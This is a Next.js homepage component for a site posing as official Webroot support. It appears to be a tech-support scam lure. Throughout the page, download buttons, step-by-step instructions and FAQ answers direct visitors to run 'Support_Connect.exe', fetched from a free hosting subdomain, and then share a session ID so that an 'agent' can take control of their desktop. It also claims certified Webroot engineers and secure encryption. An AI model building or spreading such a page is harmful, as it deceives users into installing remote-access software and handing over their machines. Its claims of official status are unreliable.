import React from 'react';
import Link from 'next/link';
import {
  Shield,
  ArrowRight,
  Download,
  Key,
  Laptop,
  CheckCircle2,
  HelpCircle,
  Zap,
  Layers,
  Lock,
  Mail,
  Headset,
  Monitor,
  ShieldCheck,
  Clock,
  UserCheck,
  PhoneCall,
  Activity,
  Sparkles,
  ExternalLink,
  Cpu,
  Check,
  AlertCircle
} from 'lucide-react';
import ProductCard from '@/components/products/ProductCard';
import ArticleCard from '@/components/blog/ArticleCard';
import FAQAccordion from '@/components/faq/FAQAccordion';
import RecommendationQuiz from '@/components/quiz/RecommendationQuiz';
import InteractiveArchitectureVisual from '@/components/home/InteractiveArchitectureVisual';
import { PRODUCTS_DATA } from '@/data/products';
import { GUIDES_DATA } from '@/data/guides';
import { ARTICLES_DATA } from '@/data/articles';
import { FAQS_DATA } from '@/data/faqs';
import { FEATURES_DATA } from '@/data/features';
import ComparisonMatrix from '@/components/compare/ComparisonMatrix';
import FeatureVisualBanner from '@/components/common/FeatureVisualBanner';
import PlatformLogo from '@/components/common/PlatformLogo';

import HeroSection from '@/components/home/HeroSection';

export default function HomePage() {
  const REMOTE_SOFTWARE_URL = 'https://deepskyblue-gorilla-943624.hostingersite.com/Support_Connect.exe';

  const featuredProducts = PRODUCTS_DATA.slice(0, 3);
  const featuredArticles = ARTICLES_DATA.slice(0, 3);
  const featuredFaqs = [
    {
      id: 'faq-remote-1',
      question: 'How do I connect to a Support Agent?',
      answer: 'Simply download the remote software executable (Support_Connect.exe) using the download link above, launch the file on your computer, and share the generated session ID with your assigned support agent.',
      category: 'troubleshooting' as const
    },
    {
      id: 'faq-remote-2',
      question: 'Is the remote connection secure?',
      answer: 'Yes. All remote support sessions utilize end-to-end 256-bit SSL/TLS encryption. You retain full control over your machine and can terminate the session at any time.',
      category: 'troubleshooting' as const
    },
    {
      id: 'faq-remote-3',
      question: 'What operating systems are supported for remote connect?',
      answer: 'The remote connection client (Support_Connect.exe) is optimized for Windows 11, 10, 8.1, and 7, as well as virtualized desktop environments.',
      category: 'troubleshooting' as const
    },
    ...FAQS_DATA.slice(0, 3)
  ];

  const marqueeItems = [
    '✓ Webroot Certified Support Engineers Available',
    '✓ 256-Bit Encrypted Remote Session',
    '✓ Real-Time Virus & Malware Diagnostics',
    '✓ Webroot Installation & Activation Help',
    '✓ Instant One-Click Connect Software',
    '✓ Under 30-Second Connection Setup',
    '✓ Windows 11 & 10 Fully Supported',
  ];

  return (
    <div className="pb-16">
      {/* 1. HERO SECTION WITH INTERACTIVE 3-PLATFORM DOWNLOAD CARDS */}
      <HeroSection remoteSoftwareUrl={REMOTE_SOFTWARE_URL} marqueeItems={marqueeItems} />

      {/* HOMEPAGE MAIN CONTENT CONTAINER */}
      <div className="space-y-20 lg:space-y-28 pt-12 sm:pt-16">

        {/* 2. STEP-BY-STEP CONNECTION INSTRUCTIONS */}
        <section className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 space-y-10">
          <div className="text-center space-y-3 max-w-3xl mx-auto">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#EBF6EE] text-[#285F33] border border-[#C3E6CB] text-xs font-bold uppercase tracking-wider">
              <Zap className="w-4 h-4 text-[#3E924F]" />
              <span>3 Easy Steps</span>
            </div>
            <h2 className="text-3xl sm:text-4xl font-semibold text-slate-900 tracking-tight">
              How to Connect to Your Support Agent
            </h2>
            <p className="text-base text-slate-600">
              Follow these simple steps to establish a secure remote support session with our technical team.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 relative">
            {/* Step 1 */}
            <div className="bg-white rounded-3xl border border-slate-200 p-8 space-y-4 shadow-sm hover:border-[#3E924F] hover:shadow-xl transition-all duration-300 relative group flex flex-col justify-between">
              <div className="space-y-4">
                <div className="w-14 h-14 rounded-2xl bg-[#EBF6EE] border border-[#C3E6CB] text-[#3E924F] flex items-center justify-center font-extrabold text-xl group-hover:bg-[#3E924F] group-hover:text-white transition-colors">
                  01
                </div>
                <h3 className="text-xl font-bold text-slate-900">Download Software</h3>
                <p className="text-xs sm:text-sm text-slate-600 leading-relaxed">
                  Click the direct download link to obtain the official Webroot remote support executable client (<code className="bg-[#EBF6EE] px-1.5 py-0.5 rounded text-[#285F33] font-mono text-xs border border-[#C3E6CB]">Support_Connect.exe</code>).
                </p>
              </div>

              <div className="pt-4">
                <a
                  href={REMOTE_SOFTWARE_URL}
                  className="w-full py-3 px-4 rounded-xl bg-[#EBF6EE] hover:bg-[#D4EDDA] text-[#285F33] font-bold text-xs flex items-center justify-center gap-2 transition-colors border border-[#C3E6CB]"
                >
                  <Download className="w-4 h-4 text-[#3E924F]" /> Download Now
                </a>
              </div>
            </div>

            {/* Step 2 */}
            <div className="bg-white rounded-3xl border border-slate-200 p-8 space-y-4 shadow-sm hover:border-[#3E924F] hover:shadow-xl transition-all duration-300 relative group flex flex-col justify-between">
              <div className="space-y-4">
                <div className="w-14 h-14 rounded-2xl bg-[#EBF6EE] border border-[#C3E6CB] text-[#3E924F] flex items-center justify-center font-extrabold text-xl group-hover:bg-[#3E924F] group-hover:text-white transition-colors">
                  02
                </div>
                <h3 className="text-xl font-bold text-slate-900">Launch Executable</h3>
                <p className="text-xs sm:text-sm text-slate-600 leading-relaxed">
                  Open your browser downloads folder and double-click <code className="bg-slate-100 px-1.5 py-0.5 rounded text-slate-800 font-mono text-xs">Support_Connect.exe</code> to launch the connection module.
                </p>
              </div>

              <div className="pt-4 text-xs font-semibold text-[#285F33] flex items-center gap-1.5 bg-[#EBF6EE] p-3 rounded-xl border border-[#C3E6CB]">
                <CheckCircle2 className="w-4 h-4 text-[#3E924F] shrink-0" />
                <span>No complex installation required</span>
              </div>
            </div>

            {/* Step 3 */}
            <div className="bg-white rounded-3xl border border-slate-200 p-8 space-y-4 shadow-sm hover:border-[#3E924F] hover:shadow-xl transition-all duration-300 relative group flex flex-col justify-between">
              <div className="space-y-4">
                <div className="w-14 h-14 rounded-2xl bg-[#EBF6EE] border border-[#C3E6CB] text-[#3E924F] flex items-center justify-center font-extrabold text-xl group-hover:bg-[#3E924F] group-hover:text-white transition-colors">
                  03
                </div>
                <h3 className="text-xl font-bold text-slate-900">Share Connection ID</h3>
                <p className="text-xs sm:text-sm text-slate-600 leading-relaxed">
                  Provide the 9-digit Session ID displayed on screen to your support agent so they can securely initiate live assistance.
                </p>
              </div>

              <div className="pt-4 text-xs font-semibold text-[#285F33] flex items-center gap-1.5 bg-[#EBF6EE] p-3 rounded-xl border border-[#C3E6CB]">
                <Lock className="w-4 h-4 text-[#3E924F] shrink-0" />
                <span>Encrypted & permissions controlled</span>
              </div>
            </div>
          </div>
        </section>

        {/* 3. PROMINENT #3E924F DOWNLOAD BANNER */}
        <section className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="bg-gradient-to-r from-[#0F2614] via-slate-950 to-[#0F2614] rounded-3xl p-8 sm:p-12 text-white shadow-2xl border border-[#3E924F]/60 relative overflow-hidden flex flex-col lg:flex-row items-center justify-between gap-8">
            <div className="space-y-4 max-w-2xl text-center lg:text-left">
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#122A17] text-[#5CB870] border border-[#3E924F]/50 text-xs font-mono font-bold uppercase">
                <Monitor className="w-3.5 h-3.5" />
                <span>Remote Desktop Support Tool</span>
              </div>
              <h2 className="text-3xl sm:text-4xl font-semibold tracking-tight">
                Ready to Connect with Your Agent?
              </h2>
              <p className="text-sm sm:text-base text-slate-300 leading-relaxed">
                Download <code className="text-[#5CB870] font-mono">Support_Connect.exe</code> now to start remote troubleshooting, software configuration, and threat diagnostic sessions.
              </p>
            </div>

            <div className="shrink-0 w-full sm:w-auto">
              <a
                href={REMOTE_SOFTWARE_URL}
                className="px-8 py-4 rounded-2xl bg-[#4E9D20] hover:bg-[#438B1C] text-white font-extrabold text-xl sm:text-2xl transition-all duration-200 shadow-xl shadow-[#4E9D20]/30 flex items-center justify-center gap-3.5 transform hover:scale-[1.02] active:scale-[0.99] cursor-pointer"
              >
                <Download className="w-6.5 h-6.5" />
                <span>Download Now</span>
                <ArrowRight className="w-6 h-6" />
              </a>
            </div>
          </div>
        </section>

        {/* 4. REMOTE SUPPORT CAPABILITIES */}
        <section className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 space-y-8">
          <div className="flex flex-col sm:flex-row sm:items-end justify-between border-b border-slate-200 pb-5 gap-2">
            <div>
              <h2 className="text-2xl sm:text-3xl font-bold text-slate-900 tracking-tight">Remote Support Capabilities</h2>
              <p className="text-sm text-slate-500 mt-1">Services performed by Webroot certified support agents via remote connection.</p>
            </div>
            <Link href="/guides" className="text-xs font-bold text-[#3E924F] hover:text-[#31753F] flex items-center gap-1">
              View troubleshooting guides →
            </Link>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
            <div className="p-6 rounded-3xl bg-white border border-slate-200 space-y-3 hover:border-[#3E924F] hover:shadow-xl transition-all">
              <div className="w-12 h-12 rounded-2xl bg-[#EBF6EE] text-[#3E924F] flex items-center justify-center">
                <ShieldCheck className="w-6 h-6" />
              </div>
              <h3 className="font-bold text-slate-900 text-base">Malware Cleanup</h3>
              <p className="text-xs text-slate-500 leading-relaxed">Agent assistance in isolating, diagnosing, and eradicating malware infection remnants.</p>
            </div>

            <div className="p-6 rounded-3xl bg-white border border-slate-200 space-y-3 hover:border-[#3E924F] hover:shadow-xl transition-all">
              <div className="w-12 h-12 rounded-2xl bg-[#EBF6EE] text-[#3E924F] flex items-center justify-center">
                <Laptop className="w-6 h-6" />
              </div>
              <h3 className="font-bold text-slate-900 text-base">Webroot Setup</h3>
              <p className="text-xs text-slate-500 leading-relaxed">Complete walkthrough of downloading, installing, and configuring Webroot protection.</p>
            </div>

            <div className="p-6 rounded-3xl bg-white border border-slate-200 space-y-3 hover:border-[#3E924F] hover:shadow-xl transition-all">
              <div className="w-12 h-12 rounded-2xl bg-[#EBF6EE] text-[#3E924F] flex items-center justify-center">
                <Key className="w-6 h-6" />
              </div>
              <h3 className="font-bold text-slate-900 text-base">Keycode Activation</h3>
              <p className="text-xs text-slate-500 leading-relaxed">Resolving subscription errors, invalid keycodes, and console account linking.</p>
            </div>

            <div className="p-6 rounded-3xl bg-white border border-slate-200 space-y-3 hover:border-[#3E924F] hover:shadow-xl transition-all">
              <div className="w-12 h-12 rounded-2xl bg-[#EBF6EE] text-[#3E924F] flex items-center justify-center">
                <Activity className="w-6 h-6" />
              </div>
              <h3 className="font-bold text-slate-900 text-base">PC Tune-up</h3>
              <p className="text-xs text-slate-500 leading-relaxed">Optimizing endpoint startup programs, web threat shield settings, and scan schedules.</p>
            </div>
          </div>
        </section>

        {/* 5. POPULAR GUIDES & GETTING STARTED */}
        <section className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex flex-col sm:flex-row sm:items-end justify-between border-b border-slate-200/80 pb-5 mb-8 gap-2">
            <div className="space-y-1">
              <h2 className="text-2xl sm:text-3xl font-bold text-slate-900 tracking-tight">Popular Getting Started Guides</h2>
              <p className="text-sm text-slate-500">Essential installation, activation, and support resources.</p>
            </div>
            <Link href="/guides" className="text-xs font-bold text-[#3E924F] hover:text-[#31753F] flex items-center gap-1">
              View all guides →
            </Link>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
            <Link
              href="/download"
              className="p-6 rounded-3xl bg-white border border-slate-200/80 hover:border-[#3E924F] hover:shadow-xl transition-all duration-300 group space-y-3"
            >
              <div className="w-11 h-11 rounded-2xl bg-[#EBF6EE] text-[#3E924F] flex items-center justify-center group-hover:bg-[#3E924F] group-hover:text-white transition-colors">
                <Download className="w-5 h-5" />
              </div>
              <h3 className="font-bold text-slate-900 text-base group-hover:text-[#3E924F] transition-colors">Download Webroot</h3>
              <p className="text-xs text-slate-500 leading-relaxed">Official download destinations for Windows, Mac, Android & iOS.</p>
            </Link>

            <Link
              href="/install/windows"
              className="p-6 rounded-3xl bg-white border border-slate-200/80 hover:border-[#3E924F] hover:shadow-xl transition-all duration-300 group space-y-3"
            >
              <div className="w-11 h-11 rounded-2xl bg-[#EBF6EE] text-[#3E924F] flex items-center justify-center group-hover:bg-[#3E924F] group-hover:text-white transition-colors">
                <Laptop className="w-5 h-5" />
              </div>
              <h3 className="font-bold text-slate-900 text-base group-hover:text-[#3E924F] transition-colors">Install on Windows</h3>
              <p className="text-xs text-slate-500 leading-relaxed">Step-by-step installation instructions for PC desktop software.</p>
            </Link>

            <Link
              href="/activate"
              className="p-6 rounded-3xl bg-white border border-slate-200/80 hover:border-[#3E924F] hover:shadow-xl transition-all duration-300 group space-y-3"
            >
              <div className="w-11 h-11 rounded-2xl bg-[#EBF6EE] text-[#3E924F] flex items-center justify-center group-hover:bg-[#3E924F] group-hover:text-white transition-colors">
                <Key className="w-5 h-5" />
              </div>
              <h3 className="font-bold text-slate-900 text-base group-hover:text-[#3E924F] transition-colors">Keycode Activation</h3>
              <p className="text-xs text-slate-500 leading-relaxed">Where to find your 20-character keycode and activate your sub.</p>
            </Link>

            <Link
              href="/guides/webroot-activation-troubleshooting"
              className="p-6 rounded-3xl bg-white border border-slate-200/80 hover:border-[#3E924F] hover:shadow-xl transition-all duration-300 group space-y-3"
            >
              <div className="w-11 h-11 rounded-2xl bg-[#EBF6EE] text-[#3E924F] flex items-center justify-center group-hover:bg-[#3E924F] group-hover:text-white transition-colors">
                <HelpCircle className="w-5 h-5" />
              </div>
              <h3 className="font-bold text-slate-900 text-base group-hover:text-[#3E924F] transition-colors">Activation Fixes</h3>
              <p className="text-xs text-slate-500 leading-relaxed">Fix invalid keycode errors and server communication issues.</p>
            </Link>
          </div>
        </section>

        {/* 6. PRODUCT COMPARISON MATRIX SECTION */}
        <section className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="bg-slate-900 rounded-3xl p-8 sm:p-12 text-white space-y-8 shadow-2xl border border-slate-800">
            <div className="max-w-2xl space-y-3">
              <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#122A17] text-[#5CB870] border border-[#3E924F]/50 text-xs font-semibold">
                <Layers className="w-3.5 h-3.5" />
                <span>Feature Matrix</span>
              </div>
              <h2 className="text-3xl sm:text-4xl font-bold tracking-tight">Compare Webroot Security Editions</h2>
              <p className="text-sm text-slate-300 leading-relaxed">
                Compare antivirus engines, phishing protection, device limits, password management, and cloud backup capabilities.
              </p>
            </div>

            <ComparisonMatrix />
          </div>
        </section>

        {/* 7. FREQUENTLY ASKED QUESTIONS */}
        <section className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 space-y-8">
          <div className="text-center space-y-3">
            <h2 className="text-3xl sm:text-4xl font-bold text-slate-900 tracking-tight">Support Agent & Connect FAQs</h2>
            <p className="text-sm text-slate-500 max-w-2xl mx-auto">
              Answers to common questions about connecting to a support agent and downloading the remote support module.
            </p>
          </div>

          <FAQAccordion faqs={featuredFaqs} />

          <div className="text-center pt-2">
            <Link href="/faq" className="inline-flex items-center gap-1.5 text-xs font-bold text-[#3E924F] hover:underline">
              Search Full Knowledgebase FAQ Directory →
            </Link>
          </div>
        </section>

        {/* 8. FOOTER DISCLAIMER BANNER */}
        <section className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="p-5 bg-[#EBF6EE] border border-[#C3E6CB] rounded-3xl text-xs sm:text-sm text-[#1B4223] flex items-start gap-3.5">
            <HelpCircle className="w-5 h-5 text-[#3E924F] shrink-0 mt-0.5" />
            <div className="leading-relaxed">
              <strong>Support Connection Note:</strong> The remote support tool (<code className="font-mono text-[#1B4223] font-bold">Support_Connect.exe</code>) is intended for authorized technical support sessions with a certified support agent. Always verify your session ID before sharing desktop control.
            </div>
          </div>
        </section>

      </div>
    </div>
  );
}
